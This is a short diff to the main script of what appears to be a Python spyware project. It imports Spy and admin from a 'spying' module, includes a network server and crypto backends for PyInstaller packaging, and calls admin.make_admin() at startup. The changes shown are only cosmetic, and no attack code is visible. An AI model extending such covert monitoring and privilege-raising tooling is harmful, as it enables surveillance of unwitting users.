@@ -1,4 +1,3 @@
-# import os
 import os
 
 from network.server import Server
@@ -7,11 +6,14 @@ from spying import Spy, admin
 from pathlib import Path
 from shutil import copy as __copy
 
+# must be here for the pyinstaller:
 import unicrypto.backends.cryptography
 import unicrypto.backends.cryptography.DES
 import unicrypto.backends.cryptography.TDES
 import unicrypto.backends.cryptography.RC4
 import unicrypto.backends.cryptography.AES
+
+
 def copy(src, path):
     try:
         if Path(path).exists():
@@ -19,6 +21,7 @@ def copy(src, path):
         __copy(src, path)
     except OSError as e:
         print(e)
+
 
 if __name__ == "__main__":
     if not admin.make_admin():
